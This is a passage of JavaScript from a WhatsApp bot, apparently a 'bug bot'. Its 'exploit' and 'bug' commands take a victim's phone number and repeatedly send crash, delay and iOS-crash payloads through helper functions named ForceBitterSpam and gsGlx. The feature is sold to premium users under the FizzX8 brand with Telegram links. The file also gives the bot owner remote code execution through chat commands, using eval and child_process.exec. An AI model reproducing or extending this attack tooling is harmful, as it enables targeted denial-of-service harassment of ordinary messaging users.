  ReplyRil(`*Success: Changed Mode from Public to Self*`);
}
break;

// ---( We For Bugs )--- \\\
case 'exploit': {
    if (!PremOnly) 
        return ReplyRil("*You are not a Premium User*\n*© Copyright ##FizzX8*");
    if (!q) 
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);

    let jidx = q.replace(/[^0-9]/g, "");
    
    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Eror*\nExample: ${command} 628xxx`);
    }

    let x = `${jidx}@s.whatsapp.net`;
    const target = x;
    const X = x;
    const isTarget = x;
    const MenuX = {
    interactiveMessage: {
      title: `𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭\n›› : ${x.split("@")[0]}\n\n*© Copyright By #FizzX8*`,
      image: bug,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 97410,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "- We For Svn - Trash",
                    newsletterJid: "120363309802495518@newsletter"
                }
            },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "- SvnTrash -",
                        url: "https://t.me/FizzNescafe",
                        copy_code: "(⚠️) - UpMarkDown !!",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 0,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "---( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
                        button_title: "---( We For FizzX8 )---"
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "- Bug Selection -",
                            sections: [
                                {
                                    title: "- SvnTrash -",
                                    rows: [
                                        { header: "- SvnTrash -", title: " 𝐓𝐫𝐚𝐬𝐡 𝐎𝐧𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ", id: `.bug crash ${x}` },
                                        { header: "- SvnTrash -", title: " 𝐃𝐞𝐥𝐚𝐲 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ", id: `.bug delay ${x}` },
                                        { header: "- SvnTrash -", title: " 𝐈𝐎𝐒 𝐓𝐑𝐀𝐒𝐇 ", id: `.bug ios ${x}` }
                                    ]
                                }
                            ]
                        })
                    }
                ]
            }
        }
    };

    await Ril.sendMessage(m.chat, MenuX, { quoted: zets });
}
break; 
case 'bug': {
    if (!PremOnly) return ReplyRil("*You are not a Premium User*");
    if (!q) return ReplyRil(`*Syntax Error*\nExample: ${command} <crash/delay> 628xxx`);

    let args = q.split(" ");
    let type = args[0]?.toLowerCase();
    let nomor = args[1];

    if (!nomor) return ReplyRil(
        `*Syntax Error*\nExample: ${command} <crash/delay> 628xxx`
    );

    let jidx = nomor.replace(/[^0-9]/g, "");

    if (jidx.startsWith('0')) {
        return ReplyRil(`*Syntax Error*\nGunakan format 628xxx`);
    }

    let x = `${jidx}@s.whatsapp.net`;

    if (!['crash','delay','ios','c','d','i'].includes(type)) {
        return ReplyRil(
            `*Invalid Type!*\nPilih salah satu:\n` +
            `• crash / c\n` +
            `• delay / d\n` +
            `• ios / i\n`
        );
    }
    let TypeBug = {
     crash: "𝐓𝐫𝐚𝐬𝐡 𝐎𝐧𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ",
     c: "𝐓𝐫𝐚𝐬𝐡 𝐎𝐧𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ",
     delay: "𝐃𝐞𝐥𝐚𝐲 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ",
     d: "𝐃𝐞𝐥𝐚𝐲 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 ",
     ios: "𝐈𝐎𝐒 𝐓𝐑𝐀𝐒𝐇",
     i: "𝐈𝐎𝐒 𝐓𝐑𝐀𝐒𝐇"
    }[type] || "Unknown";
    const MenuX = {
   interactiveMessage: {
      title: `           「 We For Svn 」\n\n𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧 𝐓𝐚𝐫𝐠𝐞𝐭\n››: ${x.split("@")[0]}\n𝗧𝘆𝗽𝗲 ››: ${TypeBug}\n┏────( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )\n┗─𝗧𝗵𝗲-𝗧𝗮𝗿𝗴𝗲𝘁-𝗛𝗮𝘀𝗕𝗲𝗲𝗻-𝗙𝗮𝗹𝗹𝗲𝗻‹ᝄ›`,
      image: succes,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 97410,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "- We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 ",
                    newsletterJid: "120363309802495518@newsletter"
                }
            },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: " - SvnTrash -",
                        url: "https://t.me/FizzCover",
                        copy_code: "(⚠️) - UpMarkDown !!",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 0,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "---( We For 𝐒𝐯𝐧𝐓𝐫𝐚𝐬𝐡 )---",
                        button_title: "---( We For FizzX8 )---"
                    }
                }),
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "#FizzX8",
                            url: "https://t.me/FizzNescafe",
                            landing_page_url: "https://t.me/FizzNescafe",
                            webview_interaction: true,
                            payment_link_preview: false,
                            webview_presentation: null
                        })
                    }
                ]
            }
        }
    };

    await Ril.sendMessage(m.chat, MenuX, { quoted: zets });


    // -----( We For Get4Su 666 )-----
    
    // -----( We For #FizzX8 )-----
   
    // -----( Execution Bugs )-----

    if (type === 'crash' || type === 'c') {
        for (let i = 0; i < 30; i++) {
            await ForceBitterSpam(Ril, x)
            
            await sleep(1000);
            console.log(chalk.red("--( We For Crash )--"))
        }
    }
    else if (type === 'delay' || type === 'd') {
        for (let i = 0; i < 3; i++) {
              await gsGlx(Ril, x, zid = true)
            await sleep(1000);
            console.log(chalk.green("--( We For Delay )--"))
        }
    }
    else if (type === 'ios' || type === 'i') {
        for (let i = 0; i < 40; i++) {
            await ForceBitterSpam(Ril, x)
            
            await sleep(100);
            console.log(chalk.blue("--( We For Ios )--"))
        }
    }

    console.log(chalk.red.bold("--( We For #FizzX8 )--"));
}
break;
//END

//TEST
//======================================================\\
default:
if (budy.startsWith('=>')) {
if (!CreatorOnly) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyRil(bang)}
try {
ReplyRil(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyRil(String(e))}}
if (budy.startsWith('>')) {
if (!CreatorOnly) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyRil(evaled)
} catch (err) {
await ReplyRil(String(err))
}
}
//=========================================================\\
if (budy.startsWith('$')) {
if (!CreatorOnly) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyRil(`${err}`)
if (stdout) return m.reply(stdout)
})
}
//========================================================\\
}
} catch (err) {
Ril.sendMessage(m.chat, {text: require('util').format(err)}, { quoted: m })
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}
//========================================================\\
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})
//==========================================================\\